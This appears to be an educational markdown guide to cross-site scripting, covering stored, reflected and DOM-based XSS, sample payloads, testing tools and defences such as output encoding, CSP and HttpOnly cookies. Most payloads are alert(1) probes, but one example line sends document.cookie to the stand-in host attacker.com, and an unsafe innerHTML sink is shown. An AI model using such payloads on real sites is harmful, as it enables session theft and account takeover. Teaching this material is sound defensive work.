# Cross-Site Scripting (XSS)

## Overview
**Cross-Site Scripting (XSS)** is a web application vulnerability that allows attackers to inject malicious client-side scripts (usually JavaScript) into web pages viewed by other users. When executed in a victim’s browser, these scripts can steal sensitive data, hijack sessions, deface websites, or perform actions on behalf of the user.

XSS is one of the **most widespread web vulnerabilities** and is consistently listed in the **OWASP Top 10**.

---

## How XSS Works

**XSS occurs when:**
1. An application accepts user input
2. The input is included in a web page **without proper validation or encoding**
3. The browser executes the injected script as trusted code

### High-Level Flow

Attacker → Injects Script → Server Stores/Reflects → Victim Loads Page → Script Executes

---

## Types of XSS

### 1️⃣ Stored XSS (Persistent XSS)

Malicious input is **stored on the server** (database, comments, profiles) and served to users later.

#### Example:

```html
<script>alert('XSS')</script>
```

📌 Impact:
-	Affects all users who view the page
-	Extremely dangerous in forums, blogs, and social platforms


### 2️⃣ Reflected XSS

Malicious input is reflected immediately in the server response (URL parameters, search results).

#### Example URL:

```html
https://example.com/search?q=<script>alert(1)</script>
```

📌 Impact:
- Requires user interaction (clicking a malicious link)
-	Common in phishing attacks


### 3️⃣ DOM-Based XSS

The vulnerability exists entirely in client-side JavaScript.
The server is not directly involved.

#### Vulnerable JavaScript:

```js
document.innerHTML = location.hash;
```

📌 Impact:
- Harder to detect
-	Often missed by traditional scanners

---

## Common Injection Points
-	Search fields
-	Comment sections
-	User profiles
-	URL parameters
-	HTTP headers
-	JavaScript variables
-	JSON responses

---

## Common Payloads

#### Basic Test Payload

```html
<script>alert(1)</script>
```

#### Image-Based Payload

```html
<img src=x onerror=alert(1)>
```

#### Event Handler Payload

```html
<button onclick="alert(1)">Click</button>
```

#### Cookie Stealing (Example)

```js
document.location='http://attacker.com?c='+document.cookie
```

---

## Impact of XSS

**XSS vulnerabilities can lead to:**
-	🍪 Session hijacking
-	🔑 Cookie theft
-	👤 Account takeover
-	🧾 Data exfiltration
-	🎭 Website defacement
-	🧠 Phishing attacks
-	⚠️ Full compromise of user trust

---

## Real-World Examples

**Twitter (2010)**
-	XSS worm spread automatically via tweets
-	Affected thousands of users within minutes

**eBay**
-	Multiple XSS vulnerabilities used for large-scale phishing

**Google & Facebook**
-	Regularly patch XSS flaws via bug bounty programs

---

## Detection & Testing

#### Manual Testing
-	Inject `<script>alert(1)</script>`
-	Try encoding variations:
  -	URL encoding
  -	HTML entities
-	Inspect DOM for unsafe JavaScript sinks

#### Automated Tools
-	Burp Suite
-	OWASP ZAP
-	XSStrike
-	Nuclei
-	Dalfox

---

## Prevention & Mitigation

### 1️⃣ Output Encoding (MOST IMPORTANT)

**Encode output based on context:**
-	HTML
-	JavaScript
-	URL
-	Attribute

---

### 2️⃣ Content Security Policy (CSP)

```http
Content-Security-Policy: script-src 'self';
```

Limits where scripts can load from.

---

### 3️⃣ Input Validation

- Use allow-lists
-	Reject unexpected input formats

---

### 4️⃣ Avoid Dangerous Functions

❌ innerHTML

❌ document.write()

✅ textContent

✅ innerText

---

### 5️⃣ HTTPOnly & Secure Cookies

```http
Set-Cookie: session=abc; HttpOnly; Secure
```

Prevents JavaScript access to cookies.

---
## XSS vs SQL Injection

| Feature        | Cross-Site Scripting (XSS) | SQL Injection (SQLi) |
|---------------|-----------------------------|----------------------|
| Affects       | End users / browsers        | Backend database     |
| Executes in   | User’s browser              | Database engine      |
| Attack code   | JavaScript / HTML           | SQL                  |
| Main impact   | Account hijacking, phishing | Data breach, data loss |
| Typical target| Client-side logic           | Server-side logic    |
| OWASP Rank    | Top 10                      | Top 10               |

---

## Hands-On Practice

-	PortSwigger Web Security Academy
-	OWASP Juice Shop
-	DVWA
-	Hack The Box
-	TryHackMe

---

## Related Attacks

-	HTML Injection
-	CSRF
-	Clickjacking
-	DOM Clobbering

---

## References

-	OWASP XSS: https://owasp.org/www-community/attacks/xss/
-	PortSwigger XSS Guide
-	MITRE CWE-79
-	Google Web Fundamentals

---

## Notes

> XSS is dangerous because it breaks the trust model of the browser.
Any JavaScript running on a page is trusted — XSS abuses that trust.

---
